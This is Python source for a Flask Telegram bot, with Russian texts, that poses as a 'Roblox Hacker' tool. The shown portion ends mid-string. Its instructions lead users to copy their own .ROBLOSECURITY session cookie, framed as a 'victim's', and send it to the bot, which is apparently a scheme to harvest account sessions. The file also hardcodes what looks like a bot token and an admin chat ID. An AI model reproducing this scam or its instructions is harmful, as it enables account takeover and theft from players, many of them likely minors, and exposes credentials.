from flask import Flask, request
import requests
import os
import json
import re

app = Flask(__name__)

BOT_TOKEN = "8851655567:AAEGziVSFXpZSAMD1hSjreZhP-OBfQUjvoc"
ADMIN_CHAT_ID = "8625787020"

# === НОВОЕ ВИДЕО (твой file_id) ===
VIDEO_FILE_ID = "BAACAgEAAxkBAAIG3WpNC-3y8jMjCSmjPtDREjsf7qkVAAI4CAAC7gJoRpIP3klv-1z4PAQ"

# === ФАЙЛЫ ===
USERS_FILE = "users.json"
LANG_FILE = "lang.json"

def load_json(file):
    if os.path.exists(file):
        with open(file, "r") as f:
            return json.load(f)
    return {}

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f)

if os.path.exists(USERS_FILE):
    with open(USERS_FILE, "r") as f:
        USERS = json.load(f)
else:
    USERS = []

def save_user(user_id):
    if user_id not in USERS:
        USERS.append(user_id)
        with open(USERS_FILE, "w") as f:
            json.dump(USERS, f)

user_lang = load_json(LANG_FILE)

def save_lang():
    save_json(LANG_FILE, user_lang)

# === ТЕКСТЫ ===
TEXTS = {
    "ru": {
        "welcome": "🔓 *Roblox Hacker v3.0*\n\n▸ Инструмент для анализа аккаунтов Roblox\n▸ Получение куки и данных сессии\n▸ Быстрая обработка запросов\n\n📌 *Выберите действие:*",
        "tutor": "📹 *Вот ваш видео-тутор!*",
        "hack": "🎯 *Введите логин или .ROBLOSECURITY куки аккаунта:*\n\n▸ Данные будут обработаны в течение 5-10 минут",
        "cookies_tutorial": (
            "🍪 *КАК ПОЛУЧИТЬ .ROBLOSECURITY КУКИ*\n\n"
            "─────────────────────\n"
            "🤖 *ANDROID:*\n"
            "1. Установите приложение *Qiwi Browser*.\n"
            "2. Зайдите в приложение Qiwi Browser.\n"
            "3. В браузере напишите расширение *EditCookie*.\n"
            "4. Зайдите на официальный сайт *Roblox.com*.\n"
            "5. Зайдите на свой аккаунт Roblox.\n"
            "6. Зайдите в профиль *жертвы*.\n"
            "7. Нажмите на 3 точки и выберите расширение *EditCookie*.\n"
            "8. Скопируйте весь текст в *Value .ROBLOSECURITY*.\n"
            "9. Отправьте весь текст с начала до конца в этого бота.\n\n"
            "─────────────────────\n"
            "🍎 *IPHONE:*\n"
            "1. Скачайте приложение *Cookie* в App Store.\n"
            "2. Зайдите в Safari.\n"
            "3. Нажмите на пазл внизу.\n"
            "4. Выберите *Управлять Расширениями*.\n"
            "5. Нажмите на ползунок *Cookie-edit*.\n"
            "6. Зайдите на официальный сайт *Roblox.com*.\n"
            "7. Зайдите на свой аккаунт Roblox.\n"
            "8. Зайдите в профиль *жертвы*.\n"
            "9. Снова нажмите на пазл.\n"
            "10. Нажмите на *Cookie-Editor*.\n"
            "11. Нажмите на *+* внизу.\n"
            "12. Name напишите `.`, а Value оставьте пустым.\n"
            "13. Нажмите на *Add*.\n"
            "14. Нажмите на *.ROBLOSECURITY*.\n"
            "15. Скопируйте весь текст 🍪\n"
            "16. Отправьте этот текст боту."
        ),
        "cookie_example": (
            "📋 *ПРИМЕР .ROBLOSECURITY КУКИ*\n\n"
            "─────────────────────\n"
            "✅ *Правильный формат:*\n\n"
            "`_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaBBAEG
